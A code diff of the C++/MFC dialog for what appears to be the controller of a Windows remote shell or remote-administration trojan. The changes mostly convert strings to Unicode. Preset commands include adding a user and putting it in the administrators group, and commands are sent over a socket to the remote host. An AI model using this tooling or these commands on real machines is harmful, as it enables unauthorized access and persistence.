@@ -57,11 +57,11 @@ void CShellDlg::SetConnSocket(SOCKET socket)
 	int cb = sizeof(addr);
 	int ir = getpeername(m_ConnSocket, (sockaddr*)&addr, &cb);
 	CString OnlineIP;
-	OnlineIP.Format("%s:%d",
-		inet_ntoa(addr.sin_addr),
+	OnlineIP.Format(_T("%s:%d"),
+		CString(inet_ntoa(addr.sin_addr)),
 		ntohs(addr.sin_port));//ntohs函数将u_long转int
 
-	SetWindowText("[Windows Remote Shell] " + OnlineIP);
+	SetWindowText(_T("[Windows Remote Shell] ") + OnlineIP);
 
 	//OnBtnShellrun();
 }
@@ -100,20 +100,20 @@ BOOL CShellDlg::OnInitDialog()
 	int strPartDim[2] = { 400, -1 };
 	m_wndStatusBar.SetParts(2, strPartDim);
 
-	m_CmdEdit.AddText("Microsoft Windows XP [版本 5.1.2600]\r\n"
-		"(C) 版权所有 1985-2001 Microsoft Corp.\r\n"
-		"\r\nCommand>");
+	m_CmdEdit.AddText(_T("Microsoft Windows XP [版本 5.1.2600]\r\n")
+		_T("(C) 版权所有 1985-2001 Microsoft Corp.\r\n")
+		_T("\r\nCommand>"));
 
 
 	CComboBox* pComboBox = (CComboBox*)GetDlgItem(IDC_COMBO_CMDLINE);
 
-	pComboBox->AddString("");
-	pComboBox->AddString("net user");
-	pComboBox->AddString("ipconfig");
-	pComboBox->AddString("netstat -ano");
-	pComboBox->AddString("tasklist");
-	pComboBox->AddString("net localgroup administrators user /add");
-	pComboBox->AddString("net user username pass /add");
+	pComboBox->AddString(_T(""));
+	pComboBox->AddString(_T("net user"));
+	pComboBox->AddString(_T("ipconfig"));
+	pComboBox->AddString(_T("netstat -ano"));
+	pComboBox->AddString(_T("tasklist"));
+	pComboBox->AddString(_T("net localgroup administrators user /add"));
+	pComboBox->AddString(_T("net user username pass /add"));
 
 	pComboBox->SetCurSel(1);
 	pComboBox->GetLBText(1, m_strCmdLine);
@@ -194,13 +194,13 @@ void CShellDlg::OnBtnShellrun()
 
 	if (m_strCmdLine.GetLength() < 2)
 	{
-		StatusTextOut(0, "请先输入命令");
+		StatusTextOut(0, _T("请先输入命令"));
 		return;
 	}
 	else
 		if (m_strCmdLine.Left(2) == "cd" || m_strCmdLine.Left(2) == "CD")
 		{
-			StatusTextOut(0, "单管道Shell,不支持cd命令");
+			StatusTextOut(0, _T("单管道Shell,不支持cd命令"));
 			return;
 		}
 		else if (m_strCmdLine == "exit" || m_strCmdLine == "EXIT")
@@ -235,17 +235,18 @@ DWORD CShellDlg::DOSShell()
 	OnWorkBegin();
 
 	m_MsgHead.dwCmd = CMD_SHELLRUN;
-	m_MsgHead.dwSize = m_strCmdLine.GetLength();
-	lstrcpy(m_Buffer, m_strCmdLine);
+	strcpy(m_Buffer, CT2A(m_strCmdLine));
+	//m_MsgHead.dwSize = m_strCmdLine.GetLength();
+	m_MsgHead.dwSize = strlen(m_Buffer);
 
 	m_CmdEdit.AddText(m_strCmdLine);
-	m_CmdEdit.AddText("\r\n");//增加回车符到编辑框中
+	m_CmdEdit.AddText(_T("\r\n"));//增加回车符到编辑框中
 
 	CComboBox* pComboBox = (CComboBox*)GetDlgItem(IDC_COMBO_CMDLINE);
 
-	if ((pComboBox->FindString(-1, m_Buffer) == CB_ERR))
+	if ((pComboBox->FindString(-1, m_strCmdLine) == CB_ERR))
 	{
-		pComboBox->AddString(m_Buffer);
+		pComboBox->AddString(m_strCmdLine);
 	}
 
 	pComboBox->SetCurSel(0);
@@ -254,29 +255,29 @@ DWORD CShellDlg::DOSShell()
 	//数据传输同时接收数据
 	if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket, m_Buffer, &m_MsgHead))
 	{
-		//数据传输失败
-		StatusTextOut(0, "通信失败");
+		StatusTextOut(0, _T("通信失败"));
 		OnWorkEnd();
 		return 0;
 	}
+
 	if (m_MsgHead.dwCmd != 0)
 	{
 		//数据传输失败
-		StatusTextOut(0, "命令执行失败");
-		m_CmdEdit.AddText("\r\n命令执行失败\r\n\r\nCommand>");
+		StatusTextOut(0, _T("命令执行失败"));
+		m_CmdEdit.AddText(_T("\r\n命令执行失败\r\n\r\nCommand>"));
 		OnWorkEnd();
 		return 0;
 	}
 
 	//显示信息
 	m_Buffer[m_MsgHead.dwSize] = 0;
-	m_CmdEdit.AddText(m_Buffer);//增加到编辑框中
+	m_CmdEdit.AddText(CString(m_Buffer));//增加到编辑框中
 
-	m_CmdEdit.AddText("\r\nCommand>");
+	m_CmdEdit.AddText(_T("\r\nCommand>"));
 
 	GetDlgItem(IDC_COMBO_CMDLINE)->SetFocus();
 
-	StatusTextOut(0, "");
+	StatusTextOut(0, _T(""));
 	OnWorkEnd();
 	return 0;
 }
@@ -291,12 +292,12 @@ LRESULT CShellDlg::OnSave(WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
-int __stdcall WriteTXT(CHAR LogFile[], CHAR Data[])
+int __stdcall WriteTXT(TCHAR LogFile[], char Data[])
 {
 	__try
 	{
 		DWORD rt;
-		HANDLE hFile = CreateFileA(LogFile, GENERIC_ALL, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+		HANDLE hFile = CreateFile(LogFile, GENERIC_ALL, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
 
 		SetFilePointer(hFile, 0, 0, FILE_END);
 		WriteFile(hFile, Data, lstrlenA(Data), &rt, 0);
@@ -315,11 +316,11 @@ void CShellDlg::OnShellSave()
 {
 	//PostMessage(WM_SAVE_DLG, 0, 0);
 
-	char dir[256], path[256] = "save_cmd.txt";
+	TCHAR dir[256], path[256] = _T("save_cmd.txt");
 
 	GetCurrentDirectory(256, dir);
 
-	CFileDialog fdlg(FALSE, ".txt", path, OFN_OVERWRITEPROMPT | OFN_EXPLORER | OFN_NOCHANGEDIR, "Text Files (*.txt)|*.txt|All Files (*.*)|*.*||", this);
+	CFileDialog fdlg(FALSE, _T(".txt"), path, OFN_OVERWRITEPROMPT | OFN_EXPLORER | OFN_NOCHANGEDIR, _T("Text Files (*.txt)|*.txt|All Files (*.*)|*.*||"), this);
 
 	fdlg.m_ofn.lpstrInitialDir = dir;
 
@@ -327,17 +328,17 @@ void CShellDlg::OnShellSave()
 	{
 		CString sz = fdlg.GetPathName();	//获取文件全路经
 
-		if (sz == "")	return;
+		if (sz == _T(""))	return;
 
 		lstrcpy(path, sz);
 
 		int len = m_CmdEdit.GetWindowTextLength() + 128;
 
-		char *cmd = (char *)VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		TCHAR *cmd = (TCHAR *)VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 		m_CmdEdit.GetWindowText(cmd, len);
 
-		WriteTXT(path, cmd);
+		WriteTXT(path, CT2A(cmd));
 
 		VirtualFree(cmd, len, MEM_RELEASE);
 	}
@@ -351,9 +352,9 @@ void CShellDlg::OnShellClear()
 {
 	m_CmdEdit.ClearEdit();
 
-	m_CmdEdit.AddText("Microsoft Windows XP [版本 5.1.2600]\r\n"
-		"(C) 版权所有 1985-2001 Microsoft Corp.\r\n"
-		"\r\nCommand>");
+	m_CmdEdit.AddText(_T("Microsoft Windows XP [版本 5.1.2600]\r\n")
+		_T("(C) 版权所有 1985-2001 Microsoft Corp.\r\n")
+		_T("\r\nCommand>"));
 }
 
 void CShellDlg::OnShellExit()
